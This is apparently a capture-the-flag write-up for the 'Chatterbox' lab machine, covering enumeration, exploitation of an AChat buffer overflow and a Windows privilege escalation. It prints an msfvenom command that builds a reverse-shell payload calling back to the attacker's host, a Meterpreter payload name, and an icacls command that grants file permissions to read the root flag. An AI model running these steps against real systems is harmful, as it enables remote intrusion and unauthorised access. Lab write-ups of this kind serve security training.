# Chatterbox

## Basic Information

|          |  |
| :---                 |     :---:      |
| Machine Name         | Chatterbox     |
| Written by           | Adir Biran       |
| IP Address           | 10.10.10.74       |
| Tools and Techniques |        |

## Method
<p align="center">
</p>


## Enumeration


#### Nmap
<p align="center">
<img width="390" alt="1" src="https://user-images.githubusercontent.com/21021400/145682481-e42bc8f4-2dc4-4c9c-b170-cd0e41167997.png">
</p>

nmap - first 10,000 ports  
<p align="center">
<img width="266" alt="2" src="https://user-images.githubusercontent.com/21021400/145682640-52874007-7631-4295-a379-d73e4ba87e7f.png">
</p>

nmap - Ports 9255, 9256  
<p align="center">
<img width="384" alt="3" src="https://user-images.githubusercontent.com/21021400/145682484-b702d067-42a3-40b4-beff-f86f5888e797.png">
</p>

Open Ports:  
9255 - HTTP  
9256 - AChat  

As was nothing found on the ports after checking the HTTP port as well, tried CVEs for AChat.  

## Exploitation

Looking for AChat exploits in metasploit  
<p align="center">
<img width="423" alt="4" src="https://user-images.githubusercontent.com/21021400/145682485-9ca3dcbc-4d26-4610-b32f-d86f40734fc3.png">
</p>

Set the options and run  
<p align="center">
<img width="464" alt="5" src="https://user-images.githubusercontent.com/21021400/145682486-8ae2f56b-59fe-4edf-b8f5-e52ef27977a7.png">
</p>

Searched google for that error and found this post  
https://github.com/rapid7/metasploit-framework/issues/14130  

Decided to try this payload:  
```
payload/windows/meterpreter/reverse_tcp_allports
```
<p align="center">
<img width="410" alt="6" src="https://user-images.githubusercontent.com/21021400/145682488-37b90ef5-9ce3-4999-bf19-ac5313f67b54.png">
</p>

meterpreter session is open but dies after a few seconds.  

Looked for exploit via searchsploit  
<p align="center">
<img width="473" alt="7" src="https://user-images.githubusercontent.com/21021400/145682489-c209eefb-b65d-484c-bc18-f79d77374072.png">
</p>

Let's give the first exploit a try.  
<p align="center">
<img width="293" alt="8" src="https://user-images.githubusercontent.com/21021400/145682491-2a340f54-806b-45ff-b8bc-5dcd99ca2a1c.png">
</p>

The content of the exploit  
<p align="center">
<img width="474" alt="9" src="https://user-images.githubusercontent.com/21021400/145682492-5e33ef24-9b67-4f37-90af-0cb85856e23e.png">
</p>

As we can see in the comment, the buf variable holds the hex code for executing calc.exe.  

We need to change the msfvenom command to get the hex representation of a reverse shell command.  
```
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=1234 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```
<p align="center">
<img width="474" alt="10" src="https://user-images.githubusercontent.com/21021400/145682493-e242bb07-0085-40e8-b455-93b6429c32aa.png">
</p>

I found it easier to replace the buf variable inside the script with opening a new python script,  
and copying the relevant parts from the previous script and the msfvenom command's output.

Last thing, is changing the IP address inside the exploit to the victim machine's IP  
<p align="center">
<img width="228" alt="11" src="https://user-images.githubusercontent.com/21021400/145682495-b54447a7-2c3f-483b-946a-dee217caf902.png">
</p>

Listening with netcat on port 1234 and running the exploit  
<p align="center">
<img width="435" alt="12" src="https://user-images.githubusercontent.com/21021400/145682497-09ac1246-a0d7-436a-9733-8cee2cd68fae.png">
</p>

## Privilege Escalation

Checking the user and its' privileges  
<p align="center">
<img width="319" alt="13" src="https://user-images.githubusercontent.com/21021400/145682498-5168b0b6-fca5-4bb7-8819-b2952a528683.png">
</p>

Checking the permissions on Administrator's home directory  
<p align="center">
<img width="238" alt="14" src="https://user-images.githubusercontent.com/21021400/145682499-341b1455-f164-4a90-bde6-6ab92f68bc02.png">
</p>

As we can see, alfred has Full access to Administrator's home directory.  
Same goes for the Desktop directory.  
<p align="center">
<img width="270" alt="15" src="https://user-images.githubusercontent.com/21021400/145682500-4abd4718-37ba-4c30-a376-a062224fd15b.png">
</p>

The root flag however, only Administrator can access it.  
<p align="center">
<img width="246" alt="16" src="https://user-images.githubusercontent.com/21021400/145682501-1492cb12-011b-4354-a27c-83da4b4680cd.png">
</p>

More on the flags and usage of icacls can be found here  
https://theitbros.com/using-icacls-to-list-folder-permissions-and-manage-files/  

Using icacls with aflred's permissions on the whole Desktop directory, we can change the root.txt file permissions to read it.  
```
icacls Administrator/Desktop/root.txt /grant alfred:F
```
<p align="center">
<img width="258" alt="17" src="https://user-images.githubusercontent.com/21021400/145682502-f9c74c30-422e-47cf-bff5-d6419276336b.png">
</p>

Checking again the permissions    
<p align="center">
<img width="248" alt="18" src="https://user-images.githubusercontent.com/21021400/145682503-39cc51a7-d076-49b1-85ae-b2c893fca32c.png">
</p>

Getting root's flag  
<p align="center">
<img width="183" alt="19" src="https://user-images.githubusercontent.com/21021400/145682505-f81a552b-eb78-4359-8f75-4d4d3a63ad1d.png">
</p>

